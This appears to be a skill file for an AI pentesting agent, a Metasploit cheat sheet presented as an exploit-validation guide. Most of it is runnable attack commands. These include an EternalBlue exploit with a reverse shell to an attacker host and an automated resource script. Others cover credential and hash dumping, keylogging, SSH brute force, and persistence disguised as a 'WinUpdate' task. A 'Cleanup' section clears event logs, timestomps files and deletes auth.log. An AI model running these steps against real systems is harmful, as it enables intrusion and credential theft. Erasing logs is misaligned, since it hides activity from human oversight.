# /metasploit — Metasploit Framework Mastery

> **Skill type:** Exploitation Tool  
> **Source:** 0x0pointer/skills `/metasploit`, 0xsteph/pentest-ai-agents `exploit-validator`  
> **Chains into:** `/post-exploit`, `/lateral-movement`  
> **Chained from:** CVE identification, service fingerprinting  
> **Note:** Always run in isolated Docker container for safety

---

## Purpose

Use Metasploit to validate vulnerabilities, deploy payloads, manage sessions, and automate post-exploitation. Treat as an exploit validation platform — confirm findings, capture evidence, then clean up.

---

## Docker Isolation (Recommended)

```bash
# Always run Metasploit in an isolated container
docker run --rm -it --network host metasploitframework/metasploit-framework msfconsole

# Or with persistent data
docker run --rm -it \
  -v $(pwd)/msf-data:/root/.msf4 \
  --network host \
  metasploitframework/metasploit-framework msfconsole
```

---

## Core msfconsole Workflow

```bash
# Start
msfconsole -q  # Quiet mode (skip banner)

# Search for exploits
search type:exploit name:eternalblue
search cve:2021-44228
search name:log4j
search platform:linux type:exploit rank:excellent

# Select and configure exploit
use exploit/windows/smb/ms17_010_eternalblue
info  # Read full description and options
show options  # See required options
show targets  # Available targets
show payloads  # Compatible payloads

set RHOSTS 192.168.1.100
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set VERBOSE true

# Check (safe verification without exploiting)
check

# Run
run  # or: exploit
```

---

## Meterpreter Post-Exploitation

```bash
# After getting a session:
sessions -l          # List all sessions
sessions -i 1        # Interact with session 1
sessions -k 1        # Kill session 1

# In Meterpreter:
sysinfo              # System information
getuid               # Current user
getpid               # Current process ID
ps                   # Process list
migrate 624          # Migrate to a different process (e.g., explorer.exe PID)

# File system
ls                   # List directory
pwd                  # Current directory
cd /tmp              # Change directory
download /etc/passwd /tmp/passwd  # Download file
upload malware.exe C:\\Users\\Public  # Upload file
cat /etc/shadow      # Read file

# Shell
shell               # Drop to system shell
^Z                  # Background shell → back to meterpreter

# Networking
ipconfig            # Network interfaces
arp                 # ARP table (find other hosts)
route               # Routing table
portfwd add -l 3306 -p 3306 -r 10.0.0.5  # Port forward

# Pivoting
run auxiliary/scanner/portscan/tcp RHOSTS=10.0.0.0/24  # Scan through pivot
```

---

## Privilege Escalation Modules

```bash
# Automated local privilege escalation suggestion
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Local privilege escalation — Windows
use exploit/windows/local/bypassuac_eventvwr  # UAC bypass
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/windows/local/hot_potato

# Linux privilege escalation
use exploit/linux/local/sudo_baron_samedit  # CVE-2021-3156
use exploit/linux/local/cve_2022_0847_dirty_pipe  # Dirty Pipe
```

---

## Post-Exploitation Modules

```bash
# Credential dumping
use post/windows/gather/credentials/credential_collector
use post/windows/gather/hashdump        # SAM database
use post/multi/gather/ssh_creds         # SSH keys
use post/windows/gather/lsa_secrets     # LSA secrets

# Keylogger
keyscan_start  # Start keylogger in meterpreter
keyscan_dump   # Dump captured keystrokes
keyscan_stop

# Screenshot
screenshot  # Single screenshot
run post/multi/gather/screen_spy  # Continuous screenshots

# Persistence
run post/windows/manage/persistence_exe STARTUP=SCHEDULER SCHTASK_NAME="WinUpdate"
```

---

## Auxiliary Modules (Scanning & Enumeration)

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389,8080
run

# SMB scanning
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_enumshares

# HTTP enumeration
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/brute_dirs

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
run

# Database scanning
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/postgres/postgres_version
```

---

## Resource Scripts (Automate Common Tasks)

```bash
# Create a resource script (.rc file)
cat > quick_win.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER
set LPORT 4444
set VERBOSE false
exploit -j
EOF

# Run resource script
msfconsole -r quick_win.rc

# Common automation patterns
cat > post_exploit.rc << 'EOF'
sessions -i 1
run post/windows/gather/hashdump
run post/multi/recon/local_exploit_suggester
run post/multi/gather/env
EOF
```

---

## Database & Workspace Management

```bash
# Initialize database
msfdb init
msfdb start

# In msfconsole
workspace -a engagement_name  # Create workspace
workspace engagement_name     # Switch workspace
db_nmap -sV -sC 192.168.1.0/24  # Nmap scan stored in DB
hosts         # View discovered hosts
services      # View discovered services
vulns         # View discovered vulnerabilities
creds         # View captured credentials
loot          # View looted data
notes         # View notes

# Export findings
db_export -f xml /tmp/msf-findings.xml
```

---

## Evidence Capture Template

```bash
# For every successful exploit, capture:
# 1. Proof of initial access
route         # Show current network routes
getuid        # Show current user
sysinfo       # Show system info

# 2. Privilege level proof
getuid        # Before: shows low-priv user
# Run privesc...
getuid        # After: shows SYSTEM/root

# 3. Impact demonstration (within scope)
# Read a sensitive file that proves impact
cat /etc/shadow  # Linux — password hashes
type C:\Windows\System32\config\SAM  # Windows — blocked, use hashdump

# 4. Cleanup
clearev       # Clear Windows event logs (only if authorized)
timestomp file.exe -m "01/01/2020 00:00:00"  # Modify timestamps
rm /var/log/auth.log  # Linux — only with authorization

# 5. Session screenshot as evidence
screenshot -p /tmp/evidence/session-$(date +%s).png
```

---

## Metasploit for Exploit Validation (Not Just Exploitation)

```bash
# Use check mode to confirm vulnerability without exploiting
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
check
# Output: "The target appears to be vulnerable." → report as confirmed
# Output: "The target is not vulnerable." → not affected

# Use auxiliary scanners for safe detection
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target.com
set THREADS 10
run
# Output: "[+] Target appears vulnerable" → confirmed without exploitation
```
